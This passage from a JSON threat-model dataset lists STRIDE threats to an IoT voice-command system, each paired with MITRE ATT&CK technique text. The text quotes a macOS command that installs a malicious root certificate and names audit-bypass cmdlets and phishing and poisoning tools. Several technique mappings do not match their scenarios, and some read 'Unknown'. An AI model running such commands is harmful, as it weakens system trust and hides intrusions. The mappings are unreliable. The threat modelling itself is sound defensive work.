Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "13",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to give voice commands via the microphone, gaining unauthorized access to IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The system cannot distinguish between voices of different users",
                    "Role": "Attacker",
                    "Condition": "Valid if voice recognition is weak or absent"
                },
                {
                    "Assumption": "The attacker has physical or remote access to the microphone",
                    "Role": "Attacker",
                    "Condition": "Valid if the microphone is accessible or poorly secured"
                }
            ],
            "Potential Impact": "Unauthorized access and control of IoT devices, leading to potential data breach and security vulnerabilities.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "impersonation",
                "voice commands",
                "IoT devices"
            ],
            "mitre_technique": {
                "name": "Spearphishing Voice",
                "description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nAdversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",
                "id": "attack-pattern--6a5d222a-a7e0-4656-b110-782c33098289",
                "technique_id": "T1598.004"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts voice commands sent from the client-side application and modifies them before they reach the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "Voice command transmission is not encrypted",
                    "Role": "Attacker",
                    "Condition": "Valid if encryption is not implemented or bypassed"
                },
                {
                    "Assumption": "The attacker has the ability to intercept and inject data into network traffic",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is insecure or the attacker has insider access"
                }
            ],
            "Potential Impact": "Information disclosure and unauthorized actions performed by the IoT devices.",
            "MITRE ATT&CK Keywords": [
                "network interception",
                "data injection",
                "man-in-the-middle",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses social engineering techniques to trick an authorized user into issuing harmful voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Users can be manipulated or coerced into performing actions",
                    "Role": "Attacker",
                    "Condition": "Valid if users are not educated about security protocols"
                },
                {
                    "Assumption": "The attacker has communication access to the user",
                    "Role": "Attacker",
                    "Condition": "Valid if channels like email or phone can be exploited by the attacker"
                }
            ],
            "Potential Impact": "Compromised system integrity and unauthorized control over IoT devices.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "phishing",
                "manipulation",
                "voice commands"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains unauthorized access to the client-side application, modifying the voice command processing logic.",
            "Assumptions": [
                {
                    "Assumption": "Client-side application access controls are weak",
                    "Role": "Attacker",
                    "Condition": "Valid if authentication methods are poor or absent"
                },
                {
                    "Assumption": "The attacker can deploy malware or direct attacks on the client-side application",
                    "Role": "Attacker",
                    "Condition": "Valid if the application is not well protected"
                }
            ],
            "Potential Impact": "Corruption or tampering of data, leading to inaccurate processing of voice commands.",
            "MITRE ATT&CK Keywords": [
                "application",
                "tampering",
                "malware",
                "client-side"
            ],
            "mitre_technique": {
                "name": "Audio Capture",
                "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
                "id": "attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967",
                "technique_id": "T1123"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies control requests sent from the client-side application to the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "Control request transmissions are not encrypted",
                    "Role": "Attacker",
                    "Condition": "Valid if encryption is not implemented or bypassed"
                },
                {
                    "Assumption": "The attacker can access and alter network traffic",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is insecure or the attacker has network access"
                }
            ],
            "Potential Impact": "Unauthorised operation of IoT devices, web application vulnerabilities, and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "network manipulation",
                "interception",
                "tampering",
                "IoT control requests"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to the IoT devices and modifies their firmware to alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices are physically accessible to the attacker",
                    "Role": "Attacker",
                    "Condition": "Valid if physical security is lacking"
                },
                {
                    "Assumption": "Firmware on the devices is not protected or is easily modifiable",
                    "Role": "Attacker",
                    "Condition": "Valid if device firmware lacks security measures"
                }
            ],
            "Potential Impact": "Device malfunctions or unauthorized actions, potentially compromising the entire system's integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "tampering",
                "physical access",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Rootkit",
                "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
                "technique_id": "T1014"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies issuing a command that caused an adverse event, and there is no way to verify the identity of the user who gave the voice command.",
            "Assumptions": [
                {
                    "Assumption": "System lacks logging and auditing capabilities for user actions",
                    "Role": "Administrator",
                    "Condition": "Valid if user actions are not recorded"
                },
                {
                    "Assumption": "Voice command system does not verify user identity",
                    "Role": "System",
                    "Condition": "Valid if there is no voice recognition or authentication process"
                }
            ],
            "Potential Impact": "Loss of accountability and difficulty in tracing actions back to users, leading to security gaps and response challenges.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Linux Audit System",
                "description": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)",
                "id": "attack-pattern--562e9b64-7239-493d-80f4-2bff900d9054",
                "technique_id": "T1562.012"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An IoT device performs actions that are not logged, making it difficult to track command origins and system changes.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms on IoT devices are not enforced",
                    "Role": "Administrator",
                    "Condition": "Valid if logging features are disabled or neglected"
                },
                {
                    "Assumption": "IoT device activity is not monitored in real-time",
                    "Role": "System",
                    "Condition": "Valid if the devices operate without oversight"
                }
            ],
            "Potential Impact": "Security incidents go undetected, leading to unauthorized actions and lack of traceability in case of a breach.",
            "MITRE ATT&CK Keywords": [
                "activity logging",
                "IoT devices",
                "system monitoring",
                "lack of traceability"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Malicious usage of the IoT controller altering the device state without leaving an execution trail.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller lacks logging mechanisms for state changes",
                    "Role": "Administrator",
                    "Condition": "Valid if state changes are not recorded"
                },
                {
                    "Assumption": "No auditing mechanism to verify legitimate changes",
                    "Role": "System",
                    "Condition": "Valid if the system does not audit actions on the IoT controller"
                }
            ],
            "Potential Impact": "Loss of integrity and accountability as unauthorized state changes go unrecorded.",
            "MITRE ATT&CK Keywords": [
                "IoT controller",
                "state changes",
                "repudiation",
                "auditing"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in the cloud services to gain unauthorized access to sensitive data stored within the IoT application.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service vulnerabilities are present",
                    "Role": "Attacker",
                    "Condition": "Valid if cloud systems are not regularly patched or tested"
                },
                {
                    "Assumption": "Sensitive data transmitted and stored on the cloud is inadequately protected",
                    "Role": "System",
                    "Condition": "Valid if encryption and access controls are not enforced"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, leading to potential privacy breaches and data theft.",
            "MITRE ATT&CK Keywords": [
                "cloud services",
                "vulnerabilities",
                "data breach",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive voice command data is intercepted between the client-side and server-side applications.",
            "Assumptions": [
                {
                    "Assumption": "Voice command data is transmitted without encryption",
                    "Role": "Attacker",
                    "Condition": "Valid if encryption is not implemented or is weak"
                },
                {
                    "Assumption": "Network is susceptible to man-in-the-middle attacks",
                    "Role": "Attacker",
                    "Condition": "Valid if the network lacks security measures"
                }
            ],
            "Potential Impact": "Exposure of user commands and potentially sensitive actions, leading to privacy violations.",
            "MITRE ATT&CK Keywords": [
                "voice data",
                "network security",
                "encryption",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider threat with access to IoT devices exfiltrates sensitive data using their legitimate access.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have legitimate but unsupervised access to the IoT devices",
                    "Role": "Insider",
                    "Condition": "Valid if there is no monitoring of insider activity"
                },
                {
                    "Assumption": "Data access controls are inadequate to prevent data exfiltration",
                    "Role": "System",
                    "Condition": "Valid if controls are weak or ineffective"
                }
            ],
            "Potential Impact": "Leakage of sensitive information and potential misuse of data by unauthorized parties.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data exfiltration",
                "IoT devices",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on the server-side application, rendering it unable to process voice commands and control IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "Server-side application is exposed to the internet",
                    "Role": "Attacker",
                    "Condition": "Valid if the server is publicly accessible"
                },
                {
                    "Assumption": "The system lacks robust DDoS protection mechanisms",
                    "Role": "System",
                    "Condition": "Valid if there are no mitigations like rate limiting or traffic filtering in place"
                }
            ],
            "Potential Impact": "Disruption of services, leading to loss of availability and potential business impact.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network",
                "server-side application",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to crash it, preventing legitimate use of the system.",
            "Assumptions": [
                {
                    "Assumption": "Client-side application has exploitable vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Valid if security bugs are present or application is not updated"
                },
                {
                    "Assumption": "User devices are susceptible to attack vectors exploiting the client-side application",
                    "Role": "Attacker",
                    "Condition": "Valid if users do not have protective measures in place"
                }
            ],
            "Potential Impact": "Inaccessibility of the voice command interface, disrupting user interaction with the system and connected IoT devices.",
            "MITRE ATT&CK Keywords": [
                "client-side application",
                "vulnerability",
                "crash",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A poorly authenticated IoT device floods the network with excessive requests, overwhelming the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices can generate large volumes of network traffic",
                    "Role": "Attacker",
                    "Condition": "Valid if devices are poorly constrained or malicious"
                },
                {
                    "Assumption": "The IoT controller cannot properly manage high traffic loads",
                    "Role": "System",
                    "Condition": "Valid if the IoT controller lacks rate limiting or traffic management functionalities"
                }
            ],
            "Potential Impact": "Disruption of the network and service outages, affecting the overall functionality of the IoT system.",
            "MITRE ATT&CK Keywords": [
                "network traffic",
                "IoT devices",
                "IoT controller",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a flaw in the authentication mechanism to gain elevated privileges on the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "Server-side application has security flaws in authentication",
                    "Role": "Attacker",
                    "Condition": "Valid if vulnerabilities exist in the login system"
                },
                {
                    "Assumption": "Attacker has knowledge or access to exploit security weaknesses",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers are skilled or knowledgeable about system weaknesses"
                }
            ],
            "Potential Impact": "Unauthorized access and control over system functionalities, leading to potential data breach and manipulation.",
            "MITRE ATT&CK Keywords": [
                "authentication bypass",
                "server-side application",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits vulnerabilities in the IoT controller firmware, gaining admin-level access to the IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "Firmware security on IoT controller is weak or flawed",
                    "Role": "Attacker",
                    "Condition": "Valid if firmware is not updated or lacks security patches"
                },
                {
                    "Assumption": "Attacker has insights into IoT controller vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has technical knowledge or access to exploit information"
                }
            ],
            "Potential Impact": "Gaining control over all IoT devices, leading to unauthorized actions and potential system-wide issues.",
            "MITRE ATT&CK Keywords": [
                "firmware vulnerability",
                "IoT controller",
                "admin access",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider gains unauthorized root access to the cloud services, allowing them to manipulate sensitive data and configurations.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have potential access to root privilege escalation methods",
                    "Role": "Insider",
                    "Condition": "Valid if misconfigurations or exploitable flaws exist in the cloud services"
                },
                {
                    "Assumption": "Cloud service doesn't adequately monitor for privilege escalation attempts",
                    "Role": "System",
                    "Condition": "Valid if monitoring and response mechanisms are absent or insufficient"
                }
            ],
            "Potential Impact": "Compromise of sensitive data and cloud infrastructure, leading to substantial security and operational risks.",
            "MITRE ATT&CK Keywords": [
                "root access",
                "privilege escalation",
                "cloud services",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
